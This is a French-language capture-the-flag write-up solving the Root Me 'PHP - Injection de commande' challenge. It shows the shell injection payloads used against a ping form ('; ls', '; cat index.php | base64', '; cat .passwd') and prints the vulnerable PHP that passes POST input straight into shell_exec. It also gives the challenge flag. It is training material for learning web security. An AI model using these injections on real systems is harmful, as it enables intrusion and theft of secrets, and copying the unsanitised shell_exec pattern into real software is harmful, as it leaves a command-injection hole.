# Compte Rendu : CTF - Root Me Challenge
### Objectif
Exploiter une injection de commande PHP pour accéder au fichier contenant le mot de passe.

#### Étape 1 : Arrivée sur la page

Observation : une page contenant un formulaire. Le titre du challenge est PHP - Injection de commande.
Action : Tester une injection basique dans le formulaire.

Injection utilisée :
```
; ls  
```
Résultat : une réponse contenant index.php.
[Page Initiale](1.png "Premier screen") 

#### Étape 2 : Lecture du fichier index.php

Action : Lire le contenu du fichier index.php via une injection en le codant en base64.
Injection utilisée :
```
; cat index.php | base64  
```
[Deuxieme parti](2.png "Deuxieme screen") 

Contenu de index.php
Code source décodé :
```
<html>
<head>
<title>Ping Service</title>
</head>
<body>
<form method="POST" action="index.php">
    <input type="text" name="ip" placeholder="127.0.0.1">
    <input type="submit">
</form>
<pre>
<?php
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
    $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
    echo $response;
}
?>
</pre>
</body>
</html>
```
Analyse et explications du code
Formulaire d'entrée utilisateur :

Le fichier contient un formulaire HTML où l'utilisateur peut soumettre une adresse IP via la méthode POST.
Ce formulaire permet à l'utilisateur de passer une valeur dans la variable PHP $_POST["ip"].
Code PHP vulnérable :

La valeur de $_POST["ip"] est directement utilisée dans une commande shell :
```
$response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
```
Vulnérabilité : Comme il n'y a aucune validation ou échappement des entrées utilisateur, on peut injecter des commandes shell après un point-virgule ;).

Fichier .passwd :

Le fichier index.php contient également cette ligne :
```
$flag = "".file_get_contents(".passwd")."";
```
Cela signifie que le fichier .passwd est lu par le script et stocké dans une variable $flag.

#### Étape 3 : Lecture du fichier .passwd

Action : Exploiter la vulnérabilité pour lire le fichier .passwd qui contient le flag ou le mot de passe.
Injection utilisée :
```
; cat .passwd  
```
[Page Finale](4.png "Dernier screen") 

#### Résultats :
flag{S3rv1ceP1n9Sup3rS3cure}

#### Conclusion :
Le challenge repose sur une injection de commande via un formulaire PHP non sécurisé. Une analyse du code source a permis de confirmer la vulnérabilité et d'accéder au fichier .passwd contenant le flag.

